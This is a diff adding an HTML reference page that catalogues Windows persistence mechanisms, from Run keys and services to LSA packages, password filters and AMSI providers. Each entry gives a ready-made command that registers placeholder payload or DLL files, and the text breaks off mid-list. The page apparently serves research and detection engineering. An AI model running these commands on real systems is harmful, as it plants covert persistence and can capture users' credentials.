@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Windows Persistence Techniques</title>
+  <style>
+    :root {
+      --bg: #0b0f17;
+      --card: rgba(22, 27, 34, 0.45);
+      --card-hover: rgba(30, 37, 48, 0.62);
+      --border: rgba(148, 163, 184, 0.16);
+      --text: #e2e8f0;
+      --heading: #7dd3fc;
+      --accent: #4ade80;
+      --danger: #f87171;
+      --muted: #94a3b8;
+      --code-bg: rgba(10, 14, 22, 0.55);
+      --shadow: rgba(0, 0, 0, 0.45);
+      --glow-blue: rgba(125, 211, 252, 0.18);
+      --glow-green: rgba(74, 222, 128, 0.12);
+      --glow-red: rgba(248, 113, 113, 0.10);
+      --token-comment: #94a3b8;
+      --token-string: #7dd3fc;
+      --token-number: #93c5fd;
+      --token-keyword: #fca5a5;
+      --token-command: #d8b4fe;
+      --token-path: #fdba74;
+      --token-flag: #86efac;
+      --token-punct: #e2e8f0;
+      --token-registry: #fdba74;
+      --token-variable: #93c5fd;
+      --token-function: #d8b4fe;
+    }
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      position: relative;
+      overflow-x: hidden;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      z-index: -2;
+      background:
+        radial-gradient(circle at 20% 20%, var(--glow-blue), transparent 30%),
+        radial-gradient(circle at 80% 10%, var(--glow-green), transparent 32%),
+        radial-gradient(circle at 75% 85%, var(--glow-red), transparent 30%),
+        radial-gradient(circle at 25% 75%, var(--glow-blue), transparent 28%);
+      animation: aurora 22s ease-in-out infinite alternate;
+    }
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      z-index: -1;
+      backdrop-filter: blur(18px) saturate(135%);
+      -webkit-backdrop-filter: blur(18px) saturate(135%);
+      background: rgba(11, 15, 23, 0.42);
+    }
+    @keyframes aurora {
+      0% { transform: scale(1) translate(0, 0); opacity: 0.85; }
+      50% { transform: scale(1.12) translate(-1.5%, 1.5%); opacity: 1; }
+      100% { transform: scale(1) translate(1.5%, -1.5%); opacity: 0.9; }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      html { scroll-behavior: auto; }
+      body::before { animation: none; }
+      .card, .controls input, .controls select, .controls button { transition: none; }
+      .card:hover, .controls button:hover, .controls input:hover, .controls select:hover { transform: none; }
+    }
+    header {
+      background: linear-gradient(180deg, rgba(22, 27, 34, 0.55), rgba(22, 27, 34, 0.35));
+      border-bottom: 1px solid var(--border);
+      padding: clamp(2rem, 6vw, 3.5rem) 1rem;
+      text-align: center;
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.4);
+    }
+    header h1 { margin: 0; color: var(--heading); font-size: clamp(1.8rem, 5vw, 2.6rem); letter-spacing: -0.02em; text-shadow: 0 2px 16px rgba(125, 211, 252, 0.28); }
+    header p { margin: .85rem auto 0; color: var(--muted); font-size: clamp(0.95rem, 2.5vw, 1.1rem); max-width: 640px; }
+    .container { width: min(100% - 1.5rem, 1200px); margin: 0 auto; padding: clamp(1rem, 3vw, 1.5rem) clamp(0.75rem, 3vw, 1rem); }
+    .controls {
+      display: flex;
+      gap: .75rem;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin: 1.25rem 0 2.75rem;
+      padding: 1rem;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      box-shadow: 0 8px 32px var(--shadow);
+    }
+    .controls input, .controls select, .controls button {
+      background: rgba(255, 255, 255, 0.06);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: .65rem 1rem;
+      font-size: .95rem;
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      transition: transform .2s ease, border-color .2s ease, box-shadow .2s ease, background .2s ease;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.18);
+      min-height: 44px;
+      min-width: 0;
+      flex: 1 1 auto;
+    }
+    .controls input { max-width: 100%; }
+    .controls input:focus, .controls select:focus, .controls button:focus {
+      outline: 2px solid var(--heading);
+      outline-offset: 2px;
+    }
+    .controls button { cursor: pointer; font-weight: 500; }
+    .controls button:hover, .controls input:hover, .controls select:hover {
+      border-color: rgba(125, 211, 252, 0.5);
+      background: rgba(255, 255, 255, 0.1);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 24px rgba(125, 211, 252, 0.12);
+    }
+    .controls button#clearFilters {
+      background: rgba(248, 113, 113, 0.12);
+      border-color: rgba(248, 113, 113, 0.35);
+      color: #fecaca;
+    }
+    .controls button#clearFilters:hover {
+      background: rgba(248, 113, 113, 0.2);
+      box-shadow: 0 6px 24px rgba(248, 113, 113, 0.18);
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(min(100%, 340px), 1fr));
+      gap: 1.25rem;
+      container-type: inline-size;
+    }
+    .card {
+      background: linear-gradient(145deg, rgba(255,255,255,0.06) 0%, var(--card) 100%);
+      border: 1px solid var(--border);
+      border-radius: 18px;
+      padding: clamp(1.1rem, 3vw, 1.35rem);
+      backdrop-filter: blur(20px) saturate(150%);
+      -webkit-backdrop-filter: blur(20px) saturate(150%);
+      box-shadow: 0 8px 32px var(--shadow);
+      transition: transform .25s ease, box-shadow .25s ease, background .25s ease, border-color .25s ease;
+      min-width: 0;
+      overflow-wrap: anywhere;
+      word-break: break-word;
+      opacity: 0;
+      transform: translateY(16px) scale(0.98);
+      animation: cardIn .5s ease forwards;
+    }
+    .card * { max-width: 100%; }
+    .card li, .card p { overflow-wrap: anywhere; }
+    .card:hover {
+      transform: translateY(-5px);
+      background: linear-gradient(145deg, rgba(255,255,255,0.08) 0%, var(--card-hover) 100%);
+      border-color: rgba(125, 211, 252, 0.28);
+      box-shadow: 0 16px 48px rgba(125, 211, 252, 0.12);
+    }
+    @keyframes cardIn {
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .card h2 { margin: 0 0 .5rem; font-size: clamp(1.05rem, 3vw, 1.25rem); color: var(--heading); letter-spacing: -0.01em; }
+    .tags { margin-bottom: .85rem; }
+    .tag {
+      display: inline-block;
+      font-size: clamp(0.68rem, 1.8vw, 0.72rem);
+      padding: .18rem .55rem;
+      border-radius: 999px;
+      margin: 0 .3rem .3rem 0;
+      border: 1px solid var(--border);
+      color: var(--muted);
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(4px);
+    }
+    .tag.admin { color: #ff9d98; border-color: rgba(248, 81, 73, 0.6); background: rgba(248, 81, 73, 0.1); }
+    .tag.user { color: #a6f0b5; border-color: rgba(63, 185, 80, 0.6); background: rgba(63, 185, 80, 0.1); }
+    .card h3 { margin: 1rem 0 .3rem; font-size: .95rem; color: var(--text); }
+    .card p, .card li { font-size: .9rem; color: var(--text); }
+    .card ul { padding-left: 1.2rem; margin: .25rem 0; list-style-position: outside; }
+    .card li { margin-bottom: .15rem; }
+    .card a { color: var(--heading); text-decoration: none; }
+    .card a:hover { text-decoration: underline; }
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: clamp(0.65rem, 2vw, 0.85rem);
+      overflow-x: auto;
+      overflow-y: hidden;
+      font-size: clamp(0.75rem, 2vw, 0.82rem);
+      color: #e6edf3;
+      white-space: pre-wrap;
+      word-break: break-word;
+      overflow-wrap: anywhere;
+      backdrop-filter: blur(8px);
+      max-width: 100%;
+      min-width: 0;
+    }
+    pre code { white-space: pre-wrap; word-break: break-word; overflow-wrap: anywhere; }
+    code { font-family: Consolas, Monaco, "Courier New", monospace; }
+    .token-comment { color: var(--token-comment); font-style: italic; }
+    .token-string { color: var(--token-string); }
+    .token-number { color: var(--token-number); }
+    .token-keyword { color: var(--token-keyword); font-weight: 600; }
+    .token-command { color: var(--token-command); font-weight: 600; }
+    .token-path { color: var(--token-path); }
+    .token-flag { color: var(--token-flag); }
+    .token-punct { color: var(--token-punct); }
+    .token-registry { color: var(--token-registry); }
+    .token-variable { color: var(--token-variable); }
+    .token-function { color: var(--token-function); }
+    .example {
+      margin-top: .75rem;
+      display: grid;
+      grid-template-rows: 1fr;
+      transition: grid-template-rows .25s ease, opacity .25s ease, margin .25s ease;
+      opacity: 1;
+    }
+    .example.hidden {
+      grid-template-rows: 0fr;
+      opacity: 0;
+      margin-top: 0;
+    }
+    .example > pre {
+      overflow: hidden;
+      min-height: 0;
+    }
+    .example-toggle {
+      display: inline-flex;
+      align-items: center;
+      gap: .35rem;
+      padding: .35rem .6rem;
+      border-radius: 10px;
+      cursor: pointer;
+      user-select: none;
+      font-size: .95rem;
+      transition: color .2s ease, background .2s ease;
+    }
+    .example-toggle:hover { color: var(--heading); background: rgba(255,255,255,0.08); }
+    .example-toggle .chevron {
+      transition: transform .25s ease;
+      font-size: 0.75em;
+    }
+    .example-toggle[aria-expanded="true"] .chevron { transform: rotate(180deg); }
+    .empty-state {
+      grid-column: 1 / -1;
+      text-align: center;
+      color: var(--muted);
+      padding: 2rem 1rem;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      backdrop-filter: blur(18px) saturate(140%);
+      -webkit-backdrop-filter: blur(18px) saturate(140%);
+    }
+    footer { text-align: center; color: var(--muted); font-size: clamp(0.8rem, 2vw, 0.9rem); margin: 2.5rem 0 1rem; padding: 1rem; background: var(--card); border: 1px solid var(--border); border-radius: 14px; backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
+    footer a { color: #a6d4ff; }
+    footer a:hover { color: #bfdbfe; }
+    @media (max-width: 640px) {
+      .controls input, .controls select, .controls button { flex: 1 1 100%; }
+      .controls { gap: .5rem; }
+      .card { padding: 1rem; }
+      .grid { grid-template-columns: 1fr; }
+      pre { font-size: 0.78rem; }
+    }
+    @media (max-width: 360px) {
+      .container { width: 100%; padding: 1rem .75rem; }
+      header { padding: 1.75rem .75rem; }
+      .tags { display: flex; flex-wrap: wrap; gap: .3rem; }
+      .tag { margin: 0; }
+    }
+    .visually-hidden {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Windows Persistence Techniques</h1>
+    <p>A single-page reference of Windows persistence mechanisms, each with a practical example.</p>
+  </header>
+
+  <div class="container">
+    <div class="controls">
+      <label for="search" class="visually-hidden">Search techniques</label>
+      <input type="text" id="search" placeholder="Search techniques..." aria-label="Search techniques">
+      <label for="filterPerm" class="visually-hidden">Filter by permissions</label>
+      <select id="filterPerm" aria-label="Filter by permissions">
+        <option value="">All permissions</option>
+        <option value="User">User</option>
+        <option value="Admin">Admin</option>
+      </select>
+      <label for="filterLaunch" class="visually-hidden">Filter by launch type</label>
+      <select id="filterLaunch" aria-label="Filter by launch type">
+        <option value="">All launch types</option>
+        <option value="Automatic">Automatic</option>
+        <option value="Logon">Logon required</option>
+        <option value="User initiated">User initiated</option>
+      </select>
+      <button id="expandAll">Expand examples</button>
+      <button id="collapseAll">Collapse examples</button>
+      <button id="clearFilters">Clear filters</button>
+    </div>
+
+    <noscript>
+      <div class="empty-state">
+        <p><strong>JavaScript is required</strong> to filter and expand the technique examples. Please enable JavaScript to use this reference.</p>
+      </div>
+    </noscript>
+
+    <div class="grid" id="cards"></div>
+    <footer>By <a href="https://zrnge.com" target="_blank" rel="noopener">Zrnge</a> · <a href="https://github.com/zrnge/win-persistence" target="_blank" rel="noopener">github.com/zrnge/win-persistence</a> · Inspired by <a href="https://persistence-info.github.io/" target="_blank" rel="noopener">persistence-info.github.io</a>. Examples are for research &amp; detection engineering only.</footer>
+  </div>
+
+  <script>
+    const techniques = [
+      {
+        title: "HKCU Run and RunOnce registry keys",
+        perm: "User",
+        context: "User",
+        type: "Registry",
+        code: "EXE; Other; Fileless",
+        launch: "Same logon required",
+        impact: "Non-destructive",
+        desc: "Any file path specified under HKCU\\...\\Run is launched by explorer.exe when the user logs on. RunOnce deletes itself after execution.",
+        location: [
+          "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+        ],
+        example: `REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /V "Updater" /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "Task Scheduler",
+        perm: "User; Admin",
+        context: "User; System",
+        type: "Other",
+        code: "EXE; DLL; Fileless; Other",
+        launch: "Automatic; Other",
+        impact: "Non-destructive",
+        desc: "Scheduled tasks run custom payloads on triggers such as logon, idle, time, or events. Admin tasks can run as SYSTEM.",
+        location: ["Task data is stored in the registry; use schtasks.exe or Task Scheduler APIs."],
+        example: `schtasks /create /tn "WindowsUpdate" /tr "C:\\Tools\\payload.exe" /sc onlogon /ru SYSTEM`
+      },
+      {
+        title: "Image File Execution Options key",
+        perm: "Admin",
+        context: "User; System",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Destructive",
+        desc: "A Debugger value under a process-named subkey causes Windows to launch the debugger instead of (or before) the target executable.",
+        location: ["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "Windows Services",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "EXE, DLL, Other",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "A new service (or a hijacked service DLL) runs automatically at boot, typically as SYSTEM.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Services"],
+        example: `sc create Updater binPath= "C:\\Tools\\payload.exe" start= auto
+sc start Updater`
+      },
+      {
+        title: "AeDebug",
+        perm: "Admin",
+        context: "User; System",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "Configures a debugger to run when an application crashes. Breaks the parent-child chain.",
+        location: ["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug" /v Debugger /t REG_SZ /d "C:\\Tools\\payload.exe -p %ld" /f
+REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug" /v Auto /t REG_SZ /d "1" /f`
+      },
+      {
+        title: "WER Debugger",
+        perm: "Admin",
+        context: "User; System",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "Windows Error Reporting launches a debugger when an application hangs.",
+        location: ["HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs"],
+        example: `REG ADD "HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs" /v Debugger /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "Natural Language Development Platform 6 DLLs",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "SearchIndexer.exe loads DLLOverridePath values under ContentIndex\\Language when indexing starts.",
+        location: [
+          "HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\English_US",
+          "HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\Neutral"
+        ],
+        example: `REG ADD "HKLM\\System\\CurrentControlSet\\Control\\ContentIndex\\Language\\Neutral" /v DLLOverridePath /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: "GPO Client-side Extension",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "The Group Policy Client Service (gpsvc) loads extension DLLs listed in GPExtensions.",
+        location: ["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GPExtensions\\{YOUR-GUID}" /v DllName /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: "Filter Handlers for Windows Search",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "Windows Search loads IFilter DLLs to extract content for indexing. Registering a malicious filter for an extension triggers load when such files are indexed.",
+        location: ["HKLM\\Software\\Classes (IFilter registration)"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Classes\\CLSID\\{YOUR-GUID}\\InprocServer32" /ve /t REG_SZ /d "C:\\Tools\\evil.dll" /f
+REG ADD "HKLM\\SOFTWARE\\Classes\\.malware\\PersistentHandler" /ve /t REG_SZ /d "{YOUR-GUID}" /f`
+      },
+      {
+        title: "Disk Cleanup Handler",
+        perm: "Admin",
+        context: "User",
+        type: "Registry",
+        code: "DLL",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "cleanmgr.exe loads custom cleanup handlers implemented as COM DLLs.",
+        location: [
+          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\",
+          "HKCR\\CLSID"
+        ],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\EvilCache" /v StateFlags0001 /t REG_DWORD /d 2 /f
+REG ADD "HKLM\\SOFTWARE\\Classes\\CLSID\\{YOUR-GUID}\\InprocServer32" /ve /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: ".chm helper DLL",
+        perm: "User",
+        context: "User",
+        type: "Registry",
+        code: "DLL",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "A DLL under HtmlHelp Author is loaded whenever a .chm help file is opened.",
+        location: ["HKCU\\Software\\Microsoft\\HtmlHelp Author"],
+        example: `REG ADD "HKCU\\Software\\Microsoft\\HtmlHelp Author" /v DllName /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: "hhctrl.ocx",
+        perm: "Admin",
+        context: "User",
+        type: "Registry",
+        code: "Other",
+        launch: "User initiated",
+        impact: "Destructive",
+        desc: "hh.exe loads hhctrl.ocx from the InprocServer32 CLSID value. Replacing it causes a malicious library to load.",
+        location: ["HKCR\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32"],
+        example: `REG ADD "HKCR\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32" /ve /t REG_SZ /d "C:\\Tools\\evil.ocx" /f`
+      },
+      {
+        title: "AMSI Providers",
+        perm: "Admin",
+        context: "User; System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "AMSI loads registered COM provider DLLs into processes that call AMSI (PowerShell, Office, etc.).",
+        location: [
+          "HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers",
+          "HKLM\\SOFTWARE\\Classes\\CLSID"
+        ],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{YOUR-GUID}" /f
+REG ADD "HKLM\\SOFTWARE\\Classes\\CLSID\\{YOUR-GUID}\\InprocServer32" /ve /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: "ServerLevelPluginDll",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "The DNS Server service loads a plugin DLL to resolve unknown names.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters"],
+        example: `REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters" /v ServerLevelPluginDll /t REG_SZ /d "C:\\Tools\\evil.dll" /f
+# Requires DNSAdmins membership / DNS Server role`
+      },
+      {
+        title: "Password Filter",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "LSA calls registered password-filter DLLs on every password change, exposing cleartext passwords.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"],
+        example: `copy C:\\Tools\\evil.dll C:\\Windows\\System32\\evil.dll
+REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "evil\\0" /f`
+      },
+      {
+        title: "Credential Manager DLL",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Any logon required",
+        impact: "Non-destructive",
+        desc: "mpnotify.exe loads Credential Manager DLLs at logon, which can capture cleartext credentials.",
+        location: [
+          "HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<Name>\\NetworkProvider"
+        ],
+        example: `REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" /v ProviderOrder /t REG_SZ /d "EvilProvider, LanmanWorkstation" /f
+REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EvilProvider\\NetworkProvider" /v ProviderPath /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: "Authentication Packages",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "lsass.exe loads all DLLs listed in the Authentication Packages REG_MULTI_SZ value at boot.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"],
+        example: `copy C:\\Tools\\evil.dll C:\\Windows\\System32\\evil.dll
+REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\\0evil\\0" /f`
+      },
+      {
+        title: "Code Signing DLL",
+        perm: "Admin",
+        context: "User",
+        type: "Registry",
+        code: "DLL",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "A malicious SIP or trust provider DLL runs whenever an application performs code-signing or signature validation.",
+        location: [
+          "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers",
+          "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID"
+        ],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP-GUID}" /v Dll /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: "HKCU cmd.exe AutoRun",
+        perm: "User",
+        context: "User",
+        type: "Registry",
+        code: "EXE; Other; Fileless",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "cmd.exe executes the AutoRun registry value automatically whenever a new command prompt starts.",
+        location: ["HKCU\\Software\\Microsoft\\Command Processor\\AutoRun"],
+        example: `REG ADD "HKCU\\Software\\Microsoft\\Command Processor" /v AutoRun /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "LSA Extension",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "lsass.exe loads DLL filenames listed in the Extensions REG_MULTI_SZ value, calling InitializeLsaExtension().",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\LsaExtensionConfig\\LsaSrv"],
+        example: `REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\LsaExtensionConfig\\LsaSrv" /v Extensions /t REG_MULTI_SZ /d "evil.dll\\0" /f
+# Requires TrustedInstaller-level permissions`
+      },
+      {
+        title: "Winlogon Notification Package",
+        perm: "Admin",
+        context: "System; User",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "Winlogon notification DLLs receive events such as logon, logoff, lock, unlock, and startup.",
+        location: ["HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify"],
+        example: `REG ADD "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\EvilNotify" /v DLLName /t REG_SZ /d "C:\\Tools\\evil.dll" /f
+REG ADD "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\EvilNotify" /v Startup /t REG_SZ /d "RunStartupRoutine" /f`
+      },
+      {
+        title: "Print Monitor",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "The print spooler service loads port and language monitor DLLs listed in the registry at startup.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors"],
+        example: `REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\Evil Monitor" /v Driver /t REG_SZ /d "C:\\Tools\\evil.dll" /f`
+      },
+      {
+        title: "HKCU Load",
+        perm: "User",
+        context: "User",
+        type: "Registry",
+        code: "EXE",
+        launch: "Same logon required",
+        impact: "Non-destructive",
+        desc: "Explorer tries to start the application named by the Load value under HKCU during logon.",
+        location: ["HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"],
+        example: `REG ADD "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v Load /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "MPNotify",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "EXE",
+        launch: "Any logon required",
+        impact: "Non-destructive",
+        desc: "winlogon.exe launches the executable named by the mpnotify value at logon. The process is killed after 30 seconds.",
+        location: ["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v mpnotify /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "Windows Platform Binary Table",
+        perm: "Other",
+        context: "System",
+        type: "Other",
+        code: "EXE",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "UEFI-based persistence: a signed binary stored in the WPBT UEFI table is written to disk as wpbbin.exe and executed early in boot.",
+        location: ["UEFI firmware tables (WPBT)"],
+        example: `# Requires a signed PE and UEFI table modification tool, e.g. WPBT-Builder
+# Disable with:
+REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /v DisableWpbtExecution /t REG_DWORD /d 1 /f`
+      },
+      {
+        title: "Explorer tools",
+        perm: "Admin",
+        context: "User",
+        type: "Registry",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "Built-in Explorer tools such as Backup, Disk Cleanup, and Defrag read paths from MyComputer keys and can be redirected.",
+        location: ["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer"],
+        example: `REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath" /ve /t REG_SZ /d "C:\\Tools\\payload.exe" /f`
+      },
+      {
+        title: "Windows Terminal Profile",
+        perm: "User",
+        context: "User",
+        type: "File",
+        code: "EXE",
+        launch: "User initiated",
+        impact: "Non-destructive",
+        desc: "A custom Windows Terminal profile can launch a payload when Terminal starts. startOnUserLogin can also enable logon execution.",
+        location: ["%LOCALAPPDATA%\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"],
+        example: `{
+  "defaultProfile": "{YOUR-GUID}",
+  "profiles": [
+    {
+      "guid": "{YOUR-GUID}",
+      "name": "Updater",
+      "commandline": "C:\\\\Tools\\\\payload.exe",
+      "startOnUserLogin": true
+    }
+  ]
+}`
+      },
+      {
+        title: "Startup Folder",
+        perm: "User",
+        context: "User",
+        type: "File",
+        code: "EXE; Other",
+        launch: "Same logon required",
+        impact: "Non-destructive",
+        desc: "Files, shortcuts, or scripts placed in the Startup folder are launched by explorer.exe after logon.",
+        location: ["%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"],
+        example: `copy C:\\Tools\\payload.exe "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Updater.exe"`
+      },
+      {
+        title: "User Init Mpr Logon Script",
+        perm: "User",
+        context: "User",
+        type: "Registry",
+        code: "EXE; Other",
+        launch: "Same logon required",
+        impact: "Non-destructive",
+        desc: "The UserInitMprLogonScript environment value points to a script that runs at user logon.",
+        location: ["HKCU\\Environment"],
+        example: `REG ADD "HKCU\\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\\Tools\\payload.cmd" /f`
+      },
+      {
+        title: "Autodial DLL",
+        perm: "Admin",
+        context: "System",
+        type: "Registry",
+        code: "DLL",
+        launch: "Automatic",
+        impact: "Non-destructive",
+        desc: "Winsock loads the AutodialDLL whenever it connects to the internet. The DLL must export WSAttemptAutodialAddr, WSAttemptAutodialName, and WSNoteSuccessfulHostentLookup.",
+        location: ["HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\AutodialDLL"],
